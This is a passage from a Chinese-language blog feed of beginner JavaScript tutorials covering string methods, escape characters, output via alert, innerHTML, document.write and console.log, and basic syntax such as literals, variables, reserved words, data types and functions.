align="center">找到一个或多个正则表达式的匹配</td></tr><tr><td align="center">replace()</td><td align="center">替换与正则表达式匹配的子串</td></tr><tr><td align="center">search()</td><td align="center">检索与正则表达式相匹配的值</td></tr><tr><td align="center">slice()</td><td align="center">提取字符串的片断，并在新的字符串中返回被提取的部分</td></tr><tr><td align="center">split()</td><td align="center">把字符串分割为子字符串数组</td></tr><tr><td align="center">substr()</td><td align="center">从起始索引号提取字符串中指定数目的字符</td></tr><tr><td align="center">substring()</td><td align="center">提取字符串中两个指定的索引号之间的字符</td></tr><tr><td align="center">toLocaleLowerCase()</td><td align="center">根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="center">toLocaleUpperCase()</td><td align="center">根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="center">toLowerCase()</td><td align="center">把字符串转换为小写</td></tr><tr><td align="center">toString()</td><td align="center">返回字符串对象值</td></tr><tr><td align="center">toUpperCase()</td><td align="center">把字符串转换为大写</td></tr><tr><td align="center">trim()</td><td align="center">移除字符串首尾空白</td></tr><tr><td align="center">valueOf()</td><td align="center">返回某个字符串对象的原始值</td></tr></tbody></table><h3 id="5-3-转义字符"><a href="#5-3-转义字符" class="headerlink" title="5.3 转义字符"></a>5.3 转义字符</h3><p>可以在字符串添加转义字符来使用引号。<br>使用实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> answer = <span class="hljs-string">&#x27;It\&#x27;s alright&#x27;</span>;<br><span class="hljs-keyword">var</span> answer = <span class="hljs-string">&quot;He is called \&quot;Johnny\&quot;&quot;</span>;<br></code></pre></div></td></tr></table></figure><h3 id="5-4-字符串长度"><a href="#5-4-字符串长度" class="headerlink" title="5.4 字符串长度"></a>5.4 字符串长度</h3><p>使用内置属性 length 来计算字符串的长度。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> txt = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-keyword">var</span> sln = txt.length;<br></code></pre></div></td></tr></table></figure><h3 id="5-5-特殊字符"><a href="#5-5-特殊字符" class="headerlink" title="5.5 特殊字符"></a>5.5 特殊字符</h3><p>在 JavaScript 中，字符串写在单引号或双引号中。<br>但以下实例 JavaScript 无法解析：</p><figure class="highlight smalltalk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smalltalk"><span class="hljs-comment">&quot;We are the so-called &quot;</span><span class="hljs-type">Vikings</span><span class="hljs-comment">&quot; from the north.&quot;</span><br></code></pre></div></td></tr></table></figure><p>字符串 “We are the so-called “ 被截断。</p><p>可以使用反斜杠 () 来转义 “Vikings” 字符串中的双引号。<br>实例：</p><figure class="highlight smalltalk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smalltalk"><span class="hljs-comment">&quot;We are the so-called \&quot;</span><span class="hljs-type">Vikings</span>\<span class="hljs-comment">&quot; from the north.&quot;</span> <br></code></pre></div></td></tr></table></figure><p>反斜杠是一个转义字符。 转义字符将特殊字符转换为字符串字符。转义字符 () 可以用于转义撇号，换行，引号，等其他特殊字符。</p><p>在字符串中可以使用转义字符转义的特殊字符：</p><table><thead><tr><th align="center">代码</th><th align="center">输出</th></tr></thead><tbody><tr><td align="center">\‘</td><td align="center">单引号</td></tr><tr><td align="center">\“</td><td align="center">双引号</td></tr><tr><td align="center">\\</td><td align="center">反斜杠</td></tr><tr><td align="center">\n</td><td align="center">换行</td></tr><tr><td align="center">\r</td><td align="center">回车</td></tr><tr><td align="center">\t</td><td align="center">tab(制表符)</td></tr><tr><td align="center">\b</td><td align="center">退格符</td></tr><tr><td align="center">\f</td><td align="center">换页符</td></tr></tbody></table><h3 id="5-6-字符串可以是对象"><a href="#5-6-字符串可以是对象" class="headerlink" title="5.6 字符串可以是对象"></a>5.6 字符串可以是对象</h3><p>通常， JavaScript 字符串是原始值，可以使用字符创建： var firstName = “John”。<br>但我们也可以使用 new 关键字将字符串定义为一个对象： var firstName = new String(“John”)。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-string">&quot;John&quot;</span>;<br><span class="hljs-keyword">var</span> y = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><span class="hljs-keyword">typeof</span> x <span class="hljs-comment">// returns String</span><br><span class="hljs-keyword">typeof</span> y <span class="hljs-comment">// returns Object</span><br></code></pre></div></td></tr></table></figure><p>不要创建 String 对象。它会拖慢执行速度，并可能产生其他副作用。</p><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-JavaScript学习（二）</title>
    <link href="/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JavaScript 是世界上最流行的脚本语言。 JavaScript 是属于 web 的语言，它适用于 PC、笔记本电脑、平板电脑和移动电话。 JavaScript 被设计为向 HTML 页面增加交互性。 许多 HTML 开发者都不是程序员，但是 JavaScript 却拥有非常简单的语法。几乎每个人都有能力将小的 JavaScript 片段添加到网页中。所有现代的 HTML 页面都使用 JavaScript，可以用于改进设计、验证表单、检测浏览器、创建cookies等。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-JavaScript-输出输入"><a href="#1-JavaScript-输出输入" class="headerlink" title="1.JavaScript 输出输入"></a>1.JavaScript 输出输入</h2><p>JavaScript 没有任何打印或者输出的函数。但JavaScript 可以通过不同的方式来输出数据。</p><blockquote><ol><li>使用 window.alert() 弹出警告框。</li><li>使用 document.write() 方法将内容写到 HTML 文档中。</li><li>使用 innerHTML 写入到 HTML 元素。</li><li>使用 console.log() 写入到浏览器的控制台。</li></ol></blockquote><h3 id="1-1-window-alert"><a href="#1-1-window-alert" class="headerlink" title="1.1 window.alert()"></a>1.1 window.alert()</h3><p>可以弹出警告框来显示数据。<br>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-built_in">window</span>.alert(<span class="hljs-number">5</span> + <span class="hljs-number">6</span>);</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-操作HTML元素（innerHTML）"><a href="#1-2-操作HTML元素（innerHTML）" class="headerlink" title="1.2 操作HTML元素（innerHTML）"></a>1.2 操作HTML元素（innerHTML）</h3><p>从 JavaScript 访问某个 HTML 元素，可以使用 document.getElementById(id) 方法。使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容。<br>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个 Web 页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span>我的第一个段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML = <span class="hljs-string">&quot;段落已修改。&quot;</span>;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-写到-HTML-文档（document-write-）"><a href="#1-3-写到-HTML-文档（document-write-）" class="headerlink" title="1.3 写到 HTML 文档（document.write()）"></a>1.3 写到 HTML 文档（document.write()）</h3><p>使用 document.write() 方法将内容写到 HTML 文档中。此功能可用于写入文本和HTML。<br>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个 Web 页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-built_in">Date</span>());</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用 document.write() 仅仅向文档输出写内容。如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。<br>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个 Web 页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;myFunction()&quot;</span>&gt;</span>点我&lt;/button &gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-built_in">Date</span>());</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-写到控制台（console-log-）"><a href="#1-4-写到控制台（console-log-）" class="headerlink" title="1.4 写到控制台（console.log()）"></a>1.4 写到控制台（console.log()）</h3><p>如果浏览器支持调试，可以使用 console.log() 方法在浏览器中显示 JavaScript 值。浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。<br>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个 Web 页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>a = 5;<br>b = 6;<br>c = a + b;<br><span class="javascript"><span class="hljs-built_in">console</span>.log(c);</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>console.log() 方法能够让看到在页面中的输出内容，让更容易调试javascript；与alert相比，console不会打断页面的操作，console里面的内容非常丰富，可以在控制台输入 console。</p><h2 id="1-5-输入（prompt）"><a href="#1-5-输入（prompt）" class="headerlink" title="1.5 输入（prompt）"></a>1.5 输入（prompt）</h2><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br>prompt(<span class="hljs-string">&#x27;输入内容&#x27;</span>)；<span class="hljs-comment">//内容为提示信息</span><br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><h2 id="2-JavaScript-语法"><a href="#2-JavaScript-语法" class="headerlink" title="2.JavaScript 语法"></a>2.JavaScript 语法</h2><p>JavaScript 是一个程序语言。语法规则定义了语言结构。JavaScript 是一个脚本语言。是一个轻量级，但功能强大的编程语言。</p><h3 id="2-1-JavaScript字面量"><a href="#2-1-JavaScript字面量" class="headerlink" title="2.1 JavaScript字面量"></a>2.1 JavaScript字面量</h3><p>在编程语言中，一个字面量是一个常量，如 3.14。</p><blockquote><ol><li>数字（Number）字面量 可以是整数或者是小数，或者是科学计数(e)。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-number">3.14</span><br><br><span class="hljs-number">1001</span><br><br><span class="hljs-number">123e5</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>字符串（String）字面量 可以使用单引号或双引号 。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-string">&quot;John Doe&quot;</span><br><br><span class="hljs-string">&#x27;John Doe&#x27;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>表达式字面量 用于计算。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-number">5</span> + <span class="hljs-number">6</span><br><br><span class="hljs-number">5</span> * <span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>数组（Array）字面量 定义一个数组。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">[<span class="hljs-number">40</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">25</span>, <span class="hljs-number">10</span>]<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>对象（Object）字面量 定义一个对象。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;<span class="hljs-attr">firstName</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">lastName</span>:<span class="hljs-string">&quot;Doe&quot;</span>, <span class="hljs-attr">age</span>:<span class="hljs-number">50</span>, <span class="hljs-attr">eyeColor</span>:<span class="hljs-string">&quot;blue&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>函数（Function）字面量 定义一个函数。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params">a, b</span>) </span>&#123; <span class="hljs-keyword">return</span> a * b;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-JavaScript-变量"><a href="#2-2-JavaScript-变量" class="headerlink" title="2.2 JavaScript 变量"></a>2.2 JavaScript 变量</h3><p>在编程语言中，变量用于存储数据值。JavaScript 使用关键字 var 来定义变量， 使用等号来为变量赋值。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x, length<br><br>x = <span class="hljs-number">5</span><br><br>length = <span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure><p>变量可以通过变量名访问。在指令式语言中，变量通常是可变的。字面量是一个恒定的值。<br>变量是一个名称。字面量是一个值。</p><h3 id="2-3-JavaScript-操作符"><a href="#2-3-JavaScript-操作符" class="headerlink" title="2.3 JavaScript 操作符"></a>2.3 JavaScript 操作符</h3><p>JavaScript使用 算术运算符 来计算值。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">x = <span class="hljs-number">5</span><br>y = <span class="hljs-number">6</span><br>z = (x + y) * <span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><p>其他多种类型的运算符：</p><table><thead><tr><th align="center">Type</th><th align="center">实例</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">赋值，算术和位运算符</td><td align="center">=、+、 -、 *、 /</td><td align="center">在 JS 运算符中描述</td></tr><tr><td align="center">条件，比较及逻辑运算符</td><td align="center">==、 !=、 &lt;、 &gt;</td><td align="center">在 JS 比较运算符中描述</td></tr></tbody></table><h3 id="2-4-JavaScript-语句"><a href="#2-4-JavaScript-语句" class="headerlink" title="2.4 JavaScript 语句"></a>2.4 JavaScript 语句</h3><p>在 HTML 中，JavaScript 语句向浏览器发出的命令。浏览器通过 JavaScript 语句明白要执行什么操作。语句是用分号分隔。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">x = <span class="hljs-number">5</span> + <span class="hljs-number">6</span>;<br>y = x * <span class="hljs-number">10</span>;<br></code></pre></div></td></tr></table></figure><h3 id="2-5-JavaScript-关键词"><a href="#2-5-JavaScript-关键词" class="headerlink" title="2.5 JavaScript 关键词"></a>2.5 JavaScript 关键词</h3><p>JavaScript 语句通常以关键词为开头。 var 关键词告诉浏览器创建一个新的变量。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-number">5</span> + <span class="hljs-number">6</span>;<br><span class="hljs-keyword">var</span> y = x * <span class="hljs-number">10</span>;<br></code></pre></div></td></tr></table></figure><h3 id="2-6-JavaScript-标识符"><a href="#2-6-JavaScript-标识符" class="headerlink" title="2.6 JavaScript 标识符"></a>2.6 JavaScript 标识符</h3><p>和其他任何编程语言一样，JavaScript 保留了一些标识符为自己所用。JavaScript 标识符必须以字母、下划线（_）或美元符（$）开始。后续的字符可以是字母、数字、下划线或美元符（数字是不允许作为首字符出现的，以便 JavaScript 可以轻易区分开标识符和数字）。</p><p>JavaScript 中重要的保留字（按字母顺序）：</p><table><thead><tr><th align="center">abstract</th><th align="center">else</th><th align="center">instanceof</th><th align="center">super</th></tr></thead><tbody><tr><td align="center">boolean</td><td align="center">enum</td><td align="center">int</td><td align="center">switch</td></tr><tr><td align="center">break</td><td align="center">export</td><td align="center">interface</td><td align="center">synchronized</td></tr><tr><td align="center">byte</td><td align="center">extends</td><td align="center">let</td><td align="center">this</td></tr><tr><td align="center">case</td><td align="center">false</td><td align="center">long</td><td align="center">throw</td></tr><tr><td align="center">catch</td><td align="center">final</td><td align="center">native</td><td align="center">throws</td></tr><tr><td align="center">char</td><td align="center">finally</td><td align="center">new</td><td align="center">transient</td></tr><tr><td align="center">class</td><td align="center">float</td><td align="center">null</td><td align="center">true</td></tr><tr><td align="center">const</td><td align="center">for</td><td align="center">package</td><td align="center">try</td></tr><tr><td align="center">continue</td><td align="center">function</td><td align="center">private</td><td align="center">typeof</td></tr><tr><td align="center">debugger</td><td align="center">goto</td><td align="center">protected</td><td align="center">var</td></tr><tr><td align="center">default</td><td align="center">if</td><td align="center">public</td><td align="center">void</td></tr><tr><td align="center">delete</td><td align="center">implements</td><td align="center">return</td><td align="center">volatile</td></tr><tr><td align="center">do</td><td align="center">import</td><td align="center">short</td><td align="center">while</td></tr><tr><td align="center">double</td><td align="center">in</td><td align="center">static</td><td align="center">with</td></tr></tbody></table><h3 id="2-7-JavaScript-注释"><a href="#2-7-JavaScript-注释" class="headerlink" title="2.7 JavaScript 注释"></a>2.7 JavaScript 注释</h3><p>双斜杠 // 后的内容将会被浏览器忽略。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// 我不会执行</span><br></code></pre></div></td></tr></table></figure><h3 id="2-8-JavaScript-数据类型"><a href="#2-8-JavaScript-数据类型" class="headerlink" title="2.8 JavaScript 数据类型"></a>2.8 JavaScript 数据类型</h3><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等。</p><p>有 5 种不同的数据类型：string、number、boolean、object、function；<br>3 种对象类型：Object、Date、Array；<br>2 个不包含任何值的数据类型：null、undefined。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> length = <span class="hljs-number">16</span>;                                  <span class="hljs-comment">// Number 通过数字字面量赋值</span><br><span class="hljs-keyword">var</span> points = x * <span class="hljs-number">10</span>;                              <span class="hljs-comment">// Number 通过表达式字面量赋值</span><br><span class="hljs-keyword">var</span> lastName = <span class="hljs-string">&quot;Johnson&quot;</span>;                         <span class="hljs-comment">// String 通过字符串字面量赋值</span><br><span class="hljs-keyword">var</span> cars = [<span class="hljs-string">&quot;Saab&quot;</span>, <span class="hljs-string">&quot;Volvo&quot;</span>, <span class="hljs-string">&quot;BMW&quot;</span>];              <span class="hljs-comment">// Array  通过数组字面量赋值</span><br><span class="hljs-keyword">var</span> person = &#123;<span class="hljs-attr">firstName</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">lastName</span>:<span class="hljs-string">&quot;Doe&quot;</span>&#125;;  <span class="hljs-comment">// Object 通过对象字面量赋值</span><br></code></pre></div></td></tr></table></figure><p>编程语言中，数据类型是一个非常重要的内容。为了可以操作变量，了解数据类型的概念非常重要。如果没有使用数据类型，很多将无法执行。</p><h3 id="2-9-JavaScript-函数"><a href="#2-9-JavaScript-函数" class="headerlink" title="2.9 JavaScript 函数"></a>2.9 JavaScript 函数</h3><p>JavaScript 语句可以写在函数内，函数可以重复引用。引用一个函数 = 调用函数(执行函数内的语句)。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> a * b;                                <span class="hljs-comment">// 返回 a 乘于 b 的结果</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="3-JavaScript-语句"><a href="#3-JavaScript-语句" class="headerlink" title="3.JavaScript 语句"></a>3.JavaScript 语句</h2><p>JavaScript 语句是发给浏览器的命令。语句的作用是告诉浏览器该做什么。</p><p>使用实例：向 id=”demo” 的 HTML 元素输出文本 “Hello Dolly” </p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML = <span class="hljs-string">&quot;你好 Dolly.&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>分号用于分隔 JavaScript 语句。通常我们在每条可执行的语句结尾添加分号。使用分号的另一用处是在一行中编写多条语句。</p><p>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 